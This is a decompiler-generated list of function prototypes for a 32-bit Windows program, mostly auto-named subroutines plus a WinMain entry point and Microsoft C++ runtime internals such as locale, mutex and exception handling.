HRESULT __stdcall sub_41A800(void *a1);
void __thiscall sub_41A830(_DWORD *this, int a2);
SC_HANDLE __stdcall sub_41A840(void *a1);
char __stdcall sub_41A8B0(void *a1);
int __stdcall sub_41A8F0(void *a1);
char __stdcall sub_41A970(void *a1);
void *__thiscall sub_41A9A0(void *this, int a2);
int __thiscall sub_41AA00(void *this);
int __thiscall sub_41AA80(void *this);
int __thiscall sub_41AB00(void *this);
int __thiscall sub_41AB80(void *this);
int __thiscall sub_41AC00(void *this);
int __thiscall sub_41AC80(void *this);
int __thiscall sub_41AD00(void *this);
int __thiscall sub_41AD80(void *this);
int __thiscall sub_41AE00(void *this);
void ***sub_41AE80();
int __thiscall sub_41AE90(int this, int a2);
void *sub_41AEC0();
int __fastcall sub_41AED0(int a1, int a2, int a3, int a4);
int sub_41AF00(int a1, int a2, ...);
int __fastcall sub_41AF20(int *a1, int a2, int a3, int a4, int a5);
int __fastcall sub_41AF60(int *a1, int a2, int a3, int a4, int a5, int a6);
int __cdecl sub_41AF90(int a1);
int __fastcall sub_41AFD0(int a1, _DWORD *a2);
int __thiscall sub_41B120(_DWORD *this);
_DWORD *__thiscall sub_41B190(_DWORD *Block, char a2);
void __thiscall sub_41B1C0(_DWORD *this);
_DWORD *__thiscall sub_41B250(_DWORD *Block, char a2);
void __thiscall sub_41B280(_DWORD *this);
_DWORD *__thiscall sub_41B310(_DWORD *Block, char a2);
void __thiscall sub_41B340(_DWORD *this);
_DWORD *__thiscall sub_41B3A0(_DWORD *Block, char a2);
void __thiscall sub_41B3D0(_DWORD *this);
_DWORD *__thiscall sub_41B470(_DWORD *Block, char a2);
void __thiscall sub_41B4A0(_DWORD *this);
_DWORD *__thiscall sub_41B500(_DWORD *Block, char a2);
void __thiscall sub_41B530(_DWORD *this);
_DWORD *__thiscall sub_41B5C0(_DWORD *Block, char a2);
void __thiscall sub_41B5F0(_DWORD *this);
_DWORD *__thiscall sub_41B680(_DWORD *Block, char a2);
_DWORD *__thiscall sub_41B6B0(_DWORD *Block, char a2);
int __thiscall sub_41B6E0(_DWORD *this);
_DWORD *__thiscall sub_41B750(_DWORD *Block, char a2);
int __thiscall sub_41B780(_DWORD *this);
_DWORD *__thiscall sub_41B830(_DWORD *Block, char a2);
void __thiscall sub_41B860(_DWORD *this);
_DWORD *__thiscall sub_41B8F0(_DWORD *Block, char a2);
void __thiscall sub_41B920(_DWORD *this);
_DWORD *__thiscall sub_41B9B0(_DWORD *Block, char a2);
void __thiscall sub_41B9E0(_DWORD *this);
_DWORD *__thiscall sub_41BA70(_DWORD *Block, char a2);
void __thiscall sub_41BAA0(_DWORD *this);
_DWORD *__thiscall sub_41BB00(_DWORD *Block, char a2);
int __thiscall sub_41BB30(_DWORD *this);
_DWORD *__thiscall sub_41BBA0(_DWORD *Block, char a2);
void __thiscall sub_41BBD0(_DWORD *this);
_DWORD *__thiscall sub_41BC30(_DWORD *Block, char a2);
void **__fastcall sub_41BC60(void **Src, char *a2, int a3);
void **__fastcall sub_41BEC0(void **Src, _DWORD *a2);
int __cdecl sub_41C190(int *a1, int a2, int a3, int a4);
char *__thiscall sub_41C1B0(char *this, int a2);
int __thiscall sub_41C250(_DWORD *this);
int __thiscall sub_41C280(_DWORD *this);
_DWORD *__thiscall sub_41C290(_DWORD *Block, char a2);
int __cdecl sub_41C2D0(int a1, int a2, int a3);
int __cdecl sub_41C430(int a1, int a2, int a3);
int __cdecl sub_41C580(int a1, int a2, int a3);
const char *sub_41C6D0();
int *sub_41C6E0();
int sub_41C750();
int __fastcall sub_41C7C0(int a1, int a2);
void __cdecl sub_41C800(int a1, int a2);
// __m128 __usercall sub_41C8A0@<xmm0>(__m128 a1@<xmm0>);
void __thiscall sub_41C8C0(LPCSTR lpszLongPath);
FILE *__thiscall sub_41C910(int this);
char *__thiscall sub_41C9C0(char *this, int a2);
char *__thiscall sub_41C9F0(char *this, int a2);
void __fastcall sub_41CA20(int a1, int a2);
void sub_41CAB0();
FILE *__fastcall sub_41CE80(LPCCH lpMultiByteStr, char *Mode);
void *sub_41CFD0();
LPSTR sub_41D6C0();
LPCSTR sub_41D7F0();
LPCSTR sub_41E2E0();
LPCSTR sub_41ED40();
void *__fastcall sub_41EF70(unsigned int a1);
int __thiscall sub_41F0D0(char *this, int a2, int a3, _DWORD *Src, _DWORD *a5, void *a6);
_DWORD *__thiscall sub_41F4B0(_DWORD *Block, char a2);
void __thiscall sub_41F4E0(_DWORD *this);
void __stdcall sub_41F670(int *a1);
int __stdcall sub_41FDA0(int a1, int a2, DWORD a3, int a4);
char __thiscall sub_420000(int *this);
int __thiscall sub_420D70(DWORD *this);
void __thiscall sub_421C40(_DWORD *this);
_BYTE *__thiscall sub_421CB0(_BYTE *this, unsigned int a2, int a3, int a4, int a5);
void __thiscall sub_421DE0(void **this);
_BYTE *__thiscall sub_421DF0(_BYTE *this, unsigned int a2, int a3, int a4, int a5);
_BYTE *__thiscall sub_421F20(_BYTE *this, int a2, int a3, int a4, int a5);
int __thiscall sub_422060(int this, int a2, int a3, int a4, int a5);
_DWORD *__thiscall sub_422230(_DWORD *this, int a2, int a3, int a4, int a5, int a6, int a7);
_BYTE *__thiscall sub_422290(_BYTE *this, int a2, int a3, int a4, int a5);
void __thiscall sub_4223B0(_DWORD *this);
char *__thiscall sub_4223E0(char *this, int a2);
const char *sub_422490();
const char *sub_4224A0();
int __fastcall sub_4224B0(int *a1, int a2, int a3, int a4);
int __thiscall sub_422930(_DWORD *this, int a2, int a3, int a4, int a5);
_DWORD *__thiscall sub_422960(_DWORD *this, int a2);
const char *sub_422AD0();
_DWORD *__thiscall sub_422AE0(_DWORD *this, int a2);
// _DWORD *__userpurge sub_422C50@<eax>(int *a1@<ecx>, float a2@<xmm3>, int a3, int a4);
int __thiscall sub_422EF0(_DWORD *this);
_BYTE *__thiscall sub_422F00(_BYTE *this, int a2, int a3, int a4, int a5, unsigned __int8 *a6);
int *__thiscall sub_423080(int *this, unsigned __int8 *a2);
const char *sub_4230D0();
int __thiscall sub_4230E0(signed int *this, size_t a2, int a3, int a4, int a5, int *a6, float a7);
_DWORD *__fastcall sub_423490(_DWORD *a1, _DWORD *a2);
const char *sub_4234A0();
_DWORD *__thiscall sub_4234B0(_DWORD *this, int *a2);
void **__thiscall sub_4235A0(void **this, char *Src, int a3, int a4, int a5, int a6);
_DWORD *__thiscall sub_4237A0(_DWORD *this, int a2, int a3);
_BYTE *__thiscall sub_423900(_BYTE *this, unsigned int a2, int a3, int a4, int a5);
int __thiscall sub_423A30(_DWORD *this, int a2, int a3, int a4, int a5);
_BYTE *__thiscall sub_423A60(_BYTE *this, int a2, int a3, int a4, int a5, float *a6);
void __thiscall sub_423CB0(_DWORD *this);
int __thiscall sub_423CD0(int this, int a2, int a3, int a4, int a5, int a6, int a7, __int64 a8, float a9, float a10);
_DWORD *__thiscall sub_423F40(void *this, _DWORD *a2);
int __thiscall sub_423F60(int this, int a2);
void **__thiscall sub_424010(void **this);
_BYTE *__thiscall sub_424050(int *this, unsigned int a2, int a3, int a4, int a5, int a6, int a7, int a8, float a9, float a10, float a11, float a12);
int __thiscall sub_42A5B0(_DWORD *this);
_DWORD *__thiscall sub_42A5C0(void *this, int a2, int a3, int a4, int a5, unsigned __int8 *a6);
int __thiscall sub_42A620(int this, int a2, int a3, int a4, int a5);
_DWORD *__thiscall sub_42A7F0(_DWORD *this, int a2, int a3);
int __thiscall sub_42A950(signed int *this, size_t a2, int a3, int a4, int a5, int *a6, float a7);
unsigned int *__thiscall sub_42AD00(int *this, unsigned int *a2, int a3, int a4);
_DWORD *__thiscall sub_42AF90(int *this, _DWORD *a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9, int a10, int a11);
// __int64 __usercall sub_42B180@<xmm0>(float a1@<xmm0>);
_DWORD *__thiscall sub_42B230(_DWORD *this, void *Src, int a3, int a4, int a5, int a6, char a7);
unsigned int *__thiscall sub_42B390(unsigned int *this, unsigned int a2);
void **__thiscall sub_42B4F0(void **this, char *Src, int a3, int a4, int a5, int a6);
_DWORD *__fastcall sub_42B6F0(_DWORD *a1, int *a2);
int *__cdecl sub_42B8A0(int *a1, int a2, int a3, int a4, int a5, int a6, int a7, unsigned int a8, int a9);
int __thiscall sub_42B990(int this, int *a2, char a3);
int __fastcall sub_42BAE0(int a1, unsigned int a2, FILE *Stream);
double *__fastcall sub_42BBB0(double *a1, double *a2);
unsigned int __fastcall sub_42BBC0(unsigned int *a1, unsigned int *a2, unsigned int *a3, unsigned int *a4);
_DWORD *__thiscall sub_42BBF0(void *this, int a2);
int __thiscall sub_42BCD0(int this, int *a2, char a3);
int *__fastcall sub_42BE20(unsigned int a1);
int *__thiscall sub_42C700(int *this, unsigned int a2, int a3);
void *__thiscall sub_42C7B0(void *this, int a2, unsigned int a3, int a4);
// int __userpurge sub_42CA50@<eax>(int a1@<ecx>, float a2@<xmm3>, int *a3, int a4);
unsigned int *__thiscall sub_42CCA0(unsigned int *this, unsigned int *a2, int a3);
int *__thiscall sub_42CE80(int *this, int a2, int a3, int a4, char *a5, float a6);
int *__thiscall sub_42D010(int *this, int a2, int a3, const char *a4, int a5, int a6, int a7, unsigned int *a8, int a9);
int *__thiscall sub_42D450(int *this, int a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9, unsigned __int8 a10, float a11);
_DWORD *__thiscall sub_42D6C0(int *this, _DWORD *a2, int a3, int a4);
int *__thiscall sub_42D780(int *this, int a2, int a3, int a4, int a5, int *a6, int *a7, int a8, float a9);
void __thiscall sub_42DB80(void **this);
void __thiscall sub_42DC70(struct std::locale::_Locimp **this, _DWORD *Src, int a3);
void __thiscall sub_42DEE0(_DWORD *this);
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd);
void **__thiscall sub_42E3B0(void **this, _BYTE *Src);
_DWORD *__thiscall sub_42E414(_DWORD *this);
char *__thiscall sub_42E42C(char *this, int a2);
char *__thiscall sub_42E458(char *this, int a2);
char *__thiscall sub_42E473(char *this, int a2);
char *__thiscall sub_42E492(char *this, int a2);
char *__thiscall sub_42E4AD(char *this, int a2);
char *__thiscall sub_42E4CC(char *this, int a2);
char *__thiscall sub_42E4E7(char *this, int a2);
char *__thiscall sub_42E502(char *this, int a2);
void __noreturn sub_42E54E(); // weak
// void __cdecl __noreturn std::_Xbad_function_call(); idb
void __cdecl __noreturn sub_42E588(int a1);
void __cdecl __noreturn sub_42E5A8(int a1);
void __cdecl __noreturn sub_42E5C8(int a1);
const char *sub_42E5E8();
int __stdcall sub_42E60D(int a1, char *a2, int a3);
int __stdcall sub_42E67D(int a1, char *a2, int a3);
char *__thiscall sub_42E759(char *this, int a2);
_DWORD *__thiscall sub_42E7AA(_DWORD *this);
// int __thiscall unknown_libname_6(_DWORD); weak
// _DWORD __stdcall std::shared_ptr<_EXCEPTION_RECORD const>::operator=(_DWORD); weak
char *__thiscall sub_42E93A(char *Block, char a2);
char *__thiscall sub_42E98E(char *Block, char a2);
void *__thiscall sub_42EA28(void *Block, char a2);
void __thiscall sub_42ED48(void *Block);
_DWORD *__cdecl sub_42EE23(_DWORD *a1);
_DWORD *__cdecl sub_42EEA3(_DWORD *a1);
// void __cdecl `anonymous namespace'::_PopulateCppExceptionRecord(_anonymous_namespace_ *__hidden this, struct _EXCEPTION_RECORD *, const void *const, const struct _s_ThrowInfo *); idb
int __cdecl sub_42EF7B(int a1, int a2);
// void __cdecl __ExceptionPtrCopy(void *, const void *); idb
// void __cdecl __ExceptionPtrCreate(void *); idb
// void __cdecl __ExceptionPtrCurrentException(void *); idb
// void __cdecl __ExceptionPtrDestroy(void *Block); idb
// void __cdecl __ExceptionPtrRethrow(const void *); idb
// bool __cdecl __ExceptionPtrToBool(const void *); idb
// int __cdecl unknown_libname_8(_DWORD, _DWORD, _DWORD, _DWORD); weak
// DWORD __stdcall GetCurrentThreadId();
// _DWORD __stdcall Concurrency::details::_ContextCallback::_CallInContext(char, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); weak
// void __cdecl Concurrency::details::_Release_chore(Concurrency::details *__hidden this, struct Concurrency::details::_Threadpool_chore *); idb
// int __cdecl Concurrency::details::_Schedule_chore(Concurrency::details *__hidden this, struct Concurrency::details::_Threadpool_chore *); idb
// void __cdecl _Cnd_register_at_thread_exit(_Cnd_t, _Mtx_t, int *);
// void __cdecl _Cnd_unregister_at_thread_exit(_Mtx_t);
// void *__thiscall Concurrency::details::GlobalCore::`vector deleting destructor'(Concurrency::details::GlobalCore *__hidden this, unsigned int); idb
// void __stdcall `vector constructor iterator'(void *, unsigned int, unsigned int, void *(__thiscall *)(void *)); idb
_DWORD *__cdecl sub_42F60B(_DWORD *a1);
void __thiscall sub_42F657(_DWORD *this);
// int __cdecl unknown_libname_9(int, _Mtx_t, int); idb
void __thiscall sub_42F727(_DWORD *this);
int __thiscall sub_42F72F(char *this);
void __thiscall sub_42F73A(_DWORD *this);
int __thiscall sub_42F742(char *this);
// int __cdecl _Cnd_broadcast(_Cnd_t);
// void __cdecl _Cnd_destroy_in_situ(_Cnd_t);
_DWORD __cdecl sub_42F834(_DWORD); // weak
int __cdecl sub_42F839(int a1, struct _Mtx_internal_imp_t *a2, int a3);
int __cdecl sub_42F842(int a1, _Mtx_t a2); // idb
int __thiscall sub_42F857(int this, int a2);
// void __stdcall __noreturn std::_Rethrow_future_exception(_DWORD, _DWORD); weak
// void __cdecl __noreturn std::_Throw_future_error(const struct std::error_code *); idb
const char *__thiscall sub_42F923(int *this);
// int __cdecl std::_Execute_once(struct std::once_flag *, int (__stdcall *)(void *, void *, void **), void *); idb
// void __cdecl __noreturn std::_XGetLastError(); idb
const char *sub_42FB5E();
// void __cdecl __noreturn std::_Throw_C_error(int); idb
// void __cdecl __noreturn std::_Throw_Cpp_error(int); idb
// const char *__cdecl std::_Syserror_map(int); idb
_DWORD *__cdecl sub_42FD6E(int a1);
void sub_42FDBA();
void __thiscall sub_42FDC2(int this);
signed __int32 __thiscall sub_42FDCD(int this);
int __thiscall sub_42FDE0(char *this);
char __thiscall sub_42FF8F(void *this);
void __thiscall sub_42FFE7(int this);
void __thiscall sub_42FFEF(int this);
int __thiscall sub_42FFFA(char *this);
// int __cdecl _Mtx_current_owns(_Mtx_t);
// void __cdecl _Mtx_destroy_in_situ(_Mtx_t);
// void __cdecl _Mtx_init_in_situ(_Mtx_t, int);
// int __cdecl _Mtx_lock(_Mtx_t);
// int __cdecl _Mtx_unlock(_Mtx_t);
// __int64 __cdecl _Query_perf_counter();
// __int64 __cdecl _Query_perf_frequency();
// __int64 __cdecl _Xtime_get_ticks();
// _DWORD __thiscall std::_Init_locks::_Init_locks(std::_Init_locks *__hidden this); idb
// _DWORD __thiscall std::_Lockit::_Lockit(std::_Lockit *__hidden this, int); idb
// void __thiscall std::_Lockit::~_Lockit(std::_Lockit *__hidden this); idb
int sub_4302FD();
// int __cdecl std::_Getloctxt<char,std::istreambuf_iterator<char>>(int, int, size_t Size, int); idb
// int __cdecl std::_Maklocstr<char>(void *Src); idb
struct std::_Facet_base *__cdecl sub_43064E(std::locale *a1);
struct std::_Facet_base *__cdecl sub_4306E3(std::locale *a1);
struct std::_Facet_base *__cdecl sub_430778(std::locale *a1);
struct std::_Facet_base *__cdecl sub_43080D(std::locale *a1);
struct std::_Facet_base *__cdecl sub_4308A2(std::locale *a1);
// _DWORD __thiscall std::_Locinfo::_Locinfo(std::_Locinfo *__hidden this, const char *); idb
char *__thiscall sub_4309DA(char *this, int a2);
_DWORD *__thiscall sub_4309F5(_DWORD *this);
// _DWORD __thiscall std::locale::locale(std::locale *__hidden this, const struct std::locale *); idb
void __thiscall sub_430A50(_DWORD *this);
// int __thiscall std::locale::id::operator unsigned int(_DWORD); weak
_DWORD *__thiscall sub_430B40(_DWORD *Block, char a2);
_DWORD *__thiscall sub_430B6E(_DWORD *Block, char a2);
_DWORD *__thiscall sub_430B9C(_DWORD *Block, char a2);
// _DWORD __cdecl unknown_libname_18(_DWORD, _DWORD, char, _DWORD); weak
// int __cdecl std::num_put<char,std::ostreambuf_iterator<char>>::_Fput(int, int, int, int, int, int, char *Str, int); idb
// int __cdecl std::codecvt<char,char,_Mbstatet>::_Getcat(int, std::locale *); idb
// int __cdecl std::ctype<char>::_Getcat(int, std::locale *); idb
int __cdecl sub_43106D(_DWORD *a1, std::locale *a2);
int __cdecl sub_4310D5(_DWORD *a1, std::locale *a2);
int __cdecl sub_43113D(_DWORD *a1, std::locale *a2);
// const struct std::locale::facet *__thiscall std::locale::_Getfacet(std::locale *__hidden this, unsigned int); idb
// int __cdecl std::num_get<char,std::istreambuf_iterator<char>>::_Getifld(int, int, int, int, int, std::locale *); idb
// _DWORD __cdecl unknown_libname_19(_DWORD, _DWORD, _DWORD, _DWORD); weak
void __thiscall sub_4323C2(volatile signed __int32 *this);
// _DWORD __stdcall std::numpunct<char>::_Init(_DWORD, _DWORD); weak
// int __cdecl std::num_put<char,std::ostreambuf_iterator<char>>::_Iput(int, int, int, int, int, int, int, size_t Size); idb
// void __cdecl std::locale::_Locimp::_Locimp_Addfac(struct std::locale::_Locimp *, struct std::locale::facet *, unsigned int); idb
// void __cdecl std::_Locinfo::_Locinfo_ctor(struct std::_Locinfo *, int, const char *Locale); idb
// struct std::locale::_Locimp *__cdecl std::locale::_Locimp::_Makeloc(const struct std::_Locinfo *, int, struct std::locale::_Locimp *, const struct std::locale *); idb
// double __cdecl std::_Stodx_v2(const char *, char **, int, int *); idb
// float __cdecl std::_Stofx_v2(const char *, char **, int, int *); idb
void __noreturn sub_432C2C(void); // weak
// int std::ctype<char>::_Tidy(void); weak
// int unknown_libname_20(void); weak
// const char *__thiscall std::locale::c_str(std::locale *__hidden this); idb
// int __thiscall unknown_libname_21(_DWORD); weak
char sub_432CC3();
char __thiscall sub_432CC6(_BYTE *this);
int sub_432CCA();
int *__thiscall sub_432CE3(void *this, int *a2, int a3, int a4, int a5, int a6, int a7, _DWORD *a8, _WORD *a9);
_DWORD *__stdcall sub_432DD1(_DWORD *a1, int a2, int a3, int a4, int a5, int a6, int a7, _DWORD *a8);
// _DWORD __stdcall unknown_libname_24(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); weak
int *__thiscall sub_4331C9(void *this, int *a2, int a3, int a4, int a5, int a6, int a7, _DWORD *a8, _DWORD *a9);
int __thiscall sub_433728(void *this, int a2, int a3, int a4, int a5, int a6, int a7);
int __thiscall sub_433793(void *this, int a2, int a3, int a4, _DWORD *a5, int a6, double X);
int __thiscall sub_4338D4(void *this, int a2, int a3, int a4, _DWORD *a5, int a6, double X);
int __thiscall sub_433ADE(void *this, int a2, int a3, int a4, int a5, int a6, int a7, int a8);
char __thiscall sub_433CF6(_BYTE *this);
// _DWORD __stdcall std::istreambuf_iterator<char>::equal(_DWORD); weak
// int __cdecl std::locale::global(_DWORD, _DWORD); weak
// int __thiscall unknown_libname_32(_DWORD); weak
double __cdecl sub_434082(float a1, int Y);
// int sprintf_s(char *const Buffer, const size_t BufferCount, const char *const Format, ...);
// void __thiscall std::_Fac_tidy_reg_t::~_Fac_tidy_reg_t(std::_Fac_tidy_reg_t *__hidden this); idb
// void __cdecl std::_Facet_Register(struct std::_Facet_base *); idb
int sub_4341CF();
// struct std::locale::_Locimp *__cdecl std::locale::_Init(bool); idb
// void __cdecl std::_Locinfo::_Locinfo_dtor(struct std::_Locinfo *); idb
// struct std::locale::_Locimp *__cdecl std::locale::_Locimp::_New_Locimp(bool); idb
// _DWORD __cdecl unknown_libname_33(_DWORD); weak
// _DWORD __cdecl unknown_libname_34(_DWORD); weak
// _DWORD __cdecl unknown_libname_35(_DWORD); weak
// int __cdecl __crtCreateEventExW(LPSECURITY_ATTRIBUTES lpEventAttributes, LPCWSTR lpName, int, int); idb
// _DWORD __cdecl __crtCreateSemaphoreExW(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); weak
// _DWORD __cdecl unknown_libname_37(_DWORD, _DWORD, _DWORD); weak
// _DWORD __cdecl unknown_libname_38(_DWORD, _DWORD, _DWORD); weak
// int __cdecl __crtFlushProcessWriteBuffers(_DWORD); weak
// _DWORD __cdecl unknown_libname_40(_DWORD, _DWORD); weak
// int __crtGetCurrentProcessorNumber(void); weak
// _DWORD __cdecl unknown_libname_41(_DWORD); weak
// int __cdecl __crtInitializeCriticalSectionEx(LPCRITICAL_SECTION lpCriticalSection, DWORD dwSpinCount, int); idb
// _DWORD __cdecl unknown_libname_42(_DWORD); weak
// _DWORD __cdecl unknown_libname_43(_DWORD); weak
// _DWORD __cdecl __crtSetThreadpoolTimer(_DWORD, _DWORD, _DWORD, _DWORD); weak
// _DWORD __cdecl __crtSetThreadpoolWait(_DWORD, _DWORD, _DWORD); weak
// _DWORD __cdecl unknown_libname_47(_DWORD, _DWORD); weak
// _DWORD __cdecl unknown_libname_48(_DWORD); weak
// _DWORD __cdecl unknown_libname_49(_DWORD); weak
// int __cdecl _Mtxdst(LPCRITICAL_SECTION lpCriticalSection); idb
// int __cdecl unknown_libname_50(LPCRITICAL_SECTION lpCriticalSection); idb
void __cdecl sub_434B0A(LPCRITICAL_SECTION lpCriticalSection);
// _Cvtvec *__cdecl _Getcvt(_Cvtvec *__return_ptr __struct_ptr retstr);
// int __cdecl std::_Getloctxt<char,std::istreambuf_iterator<wchar_t>>(int, int, size_t Size, int); idb
// _DWORD __stdcall std::_Mpunct<unsigned short>::_Getvals<unsigned short>(_DWORD, _DWORD); weak
int __thiscall sub_4353CB(int this, int a2, std::_Locinfo *a3);
// _DWORD __cdecl std::_LStrcoll<unsigned short>(_DWORD, _DWORD, _DWORD, _DWORD); weak
// int __cdecl std::_Maklocstr<wchar_t>(char *, int, _Cvtvec *); idb
void **__thiscall sub_4356DE(void **Src, unsigned int a2, char a3, size_t N, wchar_t C);
void **__thiscall sub_435773(void **Src, unsigned int a2, char a3, void *a4, int a5);
struct std::_Facet_base *__cdecl sub_435A29(std::locale *a1);
struct std::_Facet_base *__cdecl sub_435ABE(std::locale *a1);
struct std::_Facet_base *__cdecl sub_435B53(std::locale *a1);
struct std::_Facet_base *__cdecl sub_435BE8(std::locale *a1);
struct std::_Facet_base *__cdecl sub_435C7D(std::locale *a1);
struct std::_Facet_base *__cdecl sub_435D12(std::locale *a1);
struct std::_Facet_base *__cdecl sub_435DA7(std::locale *a1);
struct std::_Facet_base *__cdecl sub_435E3C(std::locale *a1);
struct std::_Facet_base *__cdecl sub_435ED1(std::locale *a1);
struct std::_Facet_base *__cdecl sub_435F66(std::locale *a1);
struct std::_Facet_base *__cdecl sub_435FFD(std::locale *a1);
struct std::_Facet_base *__cdecl sub_436092(std::locale *a1);
struct std::_Facet_base *__cdecl sub_436127(std::locale *a1);
struct std::_Facet_base *__cdecl sub_4361BC(std::locale *a1);
struct std::_Facet_base *__cdecl sub_436251(std::locale *a1);
struct std::_Facet_base *__cdecl sub_4362E6(std::locale *a1);
struct std::_Facet_base *__cdecl sub_43637B(std::locale *a1);
struct std::_Facet_base *__cdecl sub_436410(std::locale *a1);
struct std::_Facet_base *__cdecl sub_4364A5(std::locale *a1);
struct std::_Facet_base *__cdecl sub_43653A(std::locale *a1);
struct std::_Facet_base *__cdecl sub_4365CF(std::locale *a1);
struct std::_Facet_base *__cdecl sub_436664(std::locale *a1);
struct std::_Facet_base *__cdecl sub_4366F9(std::locale *a1);
struct std::_Facet_base *__cdecl sub_43678E(std::locale *a1);
struct std::_Facet_base *__cdecl sub_436823(std::locale *a1);
struct std::_Facet_base *__cdecl sub_4368B8(std::locale *a1);
_DWORD *__thiscall sub_43694D(_DWORD *this, void *Src);
_DWORD *__thiscall sub_43699A(_DWORD *this, void *a2, int a3);
// _DWORD __stdcall std::codecvt<wchar_t,char,_Mbstatet>::codecvt<wchar_t,char,_Mbstatet>(_DWORD, _DWORD); weak
// _DWORD __stdcall std::codecvt<wchar_t,char,_Mbstatet>::codecvt<wchar_t,char,_Mbstatet>(_DWORD, _DWORD); weak
_DWORD *__thiscall sub_436A30(_DWORD *this, std::_Locinfo *a2, int a3);
_DWORD *__thiscall sub_436A63(_DWORD *this, std::_Locinfo *a2, int a3);
void __thiscall sub_436AB1(_DWORD *this);
void __thiscall sub_436ACB(_DWORD *this);
// int std::ctype<wchar_t>::~ctype<wchar_t>(void); weak
void __thiscall sub_436B37(_DWORD *this);
void __thiscall sub_436B51(_DWORD *this);
// _DWORD __stdcall std::ostreambuf_iterator<wchar_t>::operator=(_DWORD); weak
// _DWORD __stdcall std::_Timevec::operator=(_DWORD); weak
// int __stdcall unknown_libname_52(void *, void *Src, int, size_t N, wchar_t C); idb
// int __stdcall `std::wstring::append'::`2'::_lambda_1_::operator()(void *, void *Src, int, void *, int); idb
_DWORD *__thiscall sub_436D67(_DWORD *Block, char a2);
_DWORD *__thiscall sub_436D89(_DWORD *Block, char a2);
void *__thiscall sub_436DCD(void *Block, char a2);
_DWORD *__thiscall sub_436DEF(_DWORD *Block, char a2);
_DWORD *__thiscall sub_436E1D(_DWORD *Block, char a2);
_DWORD *__thiscall sub_436E4B(_DWORD *Block, char a2);
_DWORD *__thiscall sub_436E79(_DWORD *Block, char a2);
_DWORD *__thiscall sub_436EA7(_DWORD *Block, char a2);
_DWORD *__thiscall sub_436EC9(_DWORD *Block, char a2);
// _DWORD __cdecl std::wstring::_Calculate_growth(_DWORD, _DWORD, _DWORD); weak
// int __stdcall unknown_libname_56(void *Src); idb
// _DWORD __stdcall std::ctype<unsigned short>::_Dowiden(char); weak
// int __cdecl std::num_put<wchar_t,std::ostreambuf_iterator<wchar_t>>::_Fput(int, int, int, int, int, int, char *Str, int); idb
// int __cdecl std::num_put<wchar_t,std::ostreambuf_iterator<wchar_t>>::_Fput(int, int, int, int, int, int, char *Str, int); idb
// int __cdecl std::codecvt<wchar_t,char,_Mbstatet>::_Getcat(int, std::locale *); idb
// int __cdecl std::codecvt<wchar_t,char,_Mbstatet>::_Getcat(int, std::locale *); idb
int __cdecl sub_4377EA(_Collvec **a1, int a2);
int __cdecl sub_43788C(_Collvec **a1, int a2);
// int __cdecl std::ctype<wchar_t>::_Getcat(int, std::locale *); idb
// int __cdecl std::ctype<wchar_t>::_Getcat(int, std::locale *); idb
int __cdecl sub_437A0E(_DWORD *a1, std::locale *a2);
int __cdecl sub_437A76(_DWORD *a1, std::locale *a2);
int __cdecl sub_437ADE(_DWORD *a1, std::locale *a2);
int __cdecl sub_437B46(_DWORD *a1, std::locale *a2);
int __cdecl sub_437BAE(_DWORD *a1, std::locale *a2);
int __cdecl sub_437C16(_DWORD *a1, std::locale *a2);
int __cdecl sub_437C7E(_DWORD *a1, std::locale *a2);
int __cdecl sub_437D02(_DWORD *a1, std::locale *a2);
int __cdecl sub_437D87(_DWORD *a1, std::locale *a2);
int __cdecl sub_437E0B(_DWORD *a1, std::locale *a2);
int __cdecl sub_437E90(_DWORD *a1, std::locale *a2);
int __cdecl sub_437EF8(_DWORD *a1, std::locale *a2);
int __cdecl sub_437F60(_DWORD *a1, std::locale *a2);
int __cdecl sub_437FC8(_DWORD *a1, std::locale *a2);
int __cdecl sub_438030(_DWORD *a1, std::locale *a2);
int __cdecl sub_4380AB(_DWORD *a1, std::locale *a2);
int __cdecl sub_438126(_DWORD *a1, std::locale *a2);
int __cdecl sub_438192(_DWORD *a1, std::locale *a2);
int __cdecl sub_4381FE(_DWORD *a1, std::locale *a2);
int __cdecl sub_438272(_DWORD *a1, std::locale *a2);
// const char *__thiscall std::_Locinfo::_Getdays(std::_Locinfo *__hidden this); idb
// _DWORD __cdecl std::num_get<wchar_t,std::istreambuf_iterator<wchar_t>>::_Getffld(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); weak
// _DWORD __stdcall std::time_get<wchar_t,std::istreambuf_iterator<wchar_t>>::_Getfmt(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); weak
// _DWORD __stdcall std::time_get<wchar_t,std::istreambuf_iterator<wchar_t>>::_Getfmt(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); weak
// int __cdecl std::num_get<wchar_t,std::istreambuf_iterator<wchar_t>>::_Getifld(int, int, int, int, int, std::locale *); idb
// int __cdecl std::num_get<wchar_t,std::istreambuf_iterator<wchar_t>>::_Getifld(int, int, int, int, int, std::locale *); idb
// _DWORD __cdecl std::time_get<wchar_t,std::istreambuf_iterator<wchar_t>>::_Getint(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); weak
// const char *__thiscall std::_Locinfo::_Getmonths(std::_Locinfo *__hidden this); idb
// _DWORD __stdcall unknown_libname_58(_DWORD, _DWORD); weak
int __thiscall sub_43C3C1(int this, int a2, char a3);
int __thiscall sub_43C48C(int this, int a2, char a3);
// _DWORD __stdcall std::ctype<wchar_t>::_Init(_DWORD); weak
// _DWORD __stdcall std::numpunct<unsigned short>::_Init(_DWORD, _DWORD); weak
// _DWORD __stdcall std::numpunct<wchar_t>::_Init(_DWORD, char); weak
int __thiscall sub_43C73A(_DWORD *this, std::_Locinfo *a2);
// int __stdcall std::time_get<wchar_t,std::istreambuf_iterator<wchar_t>>::_Init(std::_Locinfo *); idb
void __stdcall sub_43C7AA(int a1);
// int __cdecl std::num_put<wchar_t,std::ostreambuf_iterator<wchar_t>>::_Iput(int, int, int, int, int, int, int, size_t N); idb
